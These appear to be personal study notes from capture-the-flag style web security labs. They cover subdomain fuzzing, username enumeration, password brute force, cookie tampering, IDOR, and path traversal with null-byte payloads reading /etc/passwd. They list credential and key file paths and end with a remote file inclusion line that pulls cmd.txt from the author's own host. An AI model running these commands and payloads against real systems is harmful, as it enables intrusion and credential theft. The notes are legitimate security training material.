# Notes

Search for a favicon to find what framework is being used with the below command and look up the hash within the following page

```
https://wiki.owasp.org/index.php/OWASP_favicon_database
```

```
curl <path to favicon file> | md5sum
```

## Check what frameworks websites uses

```
https://www.wappalyzer.com/
```

## Look for certs for things like ssl

```
https://crt.sh/
```
## Sub Domain Enumeration

### Brute force dns

```
dnsrecon
```

### Subdomain discovery

```
https://github.com/aboul3la/Sublist3r
```

### virtual hosts

* this is needed for the tasks

```
Some subdomains aren't always hosted in publically accessible DNS results, such as development versions of a web application or administration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer's machines in their /etc/hosts file (or c:\windows\system32\drivers\etc\hosts file for Windows users) which maps domain names to IP addresses. 
```



```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP
```

```
The above command uses the -w switch to specify the wordlist we are going to use. The -H switch adds/edits a header (in this instance, the Host header), we have the FUZZ keyword in the space where a subdomain would normally go, and this is where we will try all the options from the wordlist.
Because the above command will always produce a valid result, we need to filter the output. We can do this by using the page size result with the -fs switch. Edit the below command replacing {size} with the most occurring size value from the previous result and try it on the AttackBox.
```

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.219.232 -fs 2395
```

## Authentication Bypass

* from the website we know if tells you if a user with that username has already been made so you can fuzz to get a list of valid usernames.

```
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.39.178/customers/signup -mr "username already exists"
```

### Brute force

```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.39.178/customers/login -fc 200
```

### Logic flaw

* When the logic of an authentication method can be bypassed, circumvented or manipulated.

```
curl 'http://10.10.39.178/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=Bytekage@customer.acmeitsupport.thm'
```

### Cookies

```
curl -H "Cookie: logged_in=true; admin=true" http://10.10.39.178/cookie-test
```

* crack stations is an online site to crack hashes

```
echo VEhNe0JBU0U2NF9FTkNPRElOR30= | base64 --decode
echo '{"id":1,"admin":true}' | base64
```

## IDOR (INSECURE DIRECT OBJECT REFERENCE)

* caused from when server gets user supplied input to retrieve things like files, but no validation is done to tell if the user has access or owns these objects

* A good way to test with unpredictable ids is to make 2 accounts and swap the ids to see if you can view the item when you're logged into a different account

* You can sometimes see the query in the network tab for an api call getting user data. Try and change the number to see if you get anything.

## File Inclusion

* LFI -> Local file inclusion
* RFI -> Remote file inclusion

* Occurs when user input isn't sanatised or validated

### Path Traversal (dot-dot-slash attack)

* Allows attacker to read operating system resources such as local files on the server. Abuses the web apps url to locate and read files or directories.
* Normally happens cause of poor sanitation and use of the ***file_get_contents*** php function.


```
Location	Description

/etc/issue
	contains a message or system identification to be printed before the login prompt.

/etc/profile
	

controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived

/proc/version
	specifies the version of the Linux kernel

/etc/passwd
	has all registered user that has access to a system

/etc/shadow
	contains information about the system's users' passwords

/root/.bash_history
	

contains the history commands for root user

/var/log/dmessage
	contains global system messages, including the messages that are logged during system startup

/var/mail/root
	

all emails for root user

/root/.ssh/id_rsa
	Private SSH keys for a root or any known valid user on the server

/var/log/apache2/access.log
	

the accessed requests for Apache  webserver

C:\boot.ini
	contains the boot options for computers with BIOS firmware

```

### LFI

```
With PHP, using functions such as include, require, include_once, and require_once often contribute to vulnerable web applications
```
 * to find what is specified in the include path you can put in a bad input and read the error.

 * if something is being added to the end of your input such as .php you can get the web app to ignore this by adding a null byte

```
%00 or 0x00 
"languages/../../../../../etc/passwd%00"
NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.
```

examples from how I got answers

```
http://10.10.65.208/lab6.php?file=THM-profile/../../../../etc/os-release%00

lab3.php?file=../../../../etc/passwd%00
```

### RFI

* again from bad sanitation and allows for an atacker to inhect an external url into include.
* Requirements is that allopw)url_fopen option needs to be on.
* Other consequences of RFI are:
    * Sensitive information Discolsure
    * Cross-site Scripting
    * Denial of Service

### Remediation

```

    Keep system and services, including web application frameworks, updated with the latest version.
    Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
    A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
    Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.
    Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
    Never trust user input, and make sure to implement proper input validation against file inclusion.
    Implement whitelisting for file names and locations as well as blacklisting.
```

### Challenges

#### Challenge one

Using burp put the following in a repeater

```
POST /challenges/chall1.php HTTP/1.1
Host: 10.10.65.208
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer:
http://10.10.65.208/challenges/chall1.php?file=..%2F..%2F..%2F..%2Fetc%2Fflag1
Cookie: THM=Guest
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

file=../../../../etc/flag1
```

#### Challenge two

The page uses the cookie to display content so

```
GET /challenges/chall2.php HTTP/1.1
Host: 10.10.65.208
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: THM=../../../../etc/flag2%00
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

```

#### Challenge three

Just need a post request

```
curl -X POST 10.10.65.208/challenges/chall3.php -d 'method=POST&file=../../../../etc/flag3%00' --output -
```

#### Challenge four (RFI)

```
10.10.65.208/playground.php?file=http://<my-ip>:8000/cmd.txt
```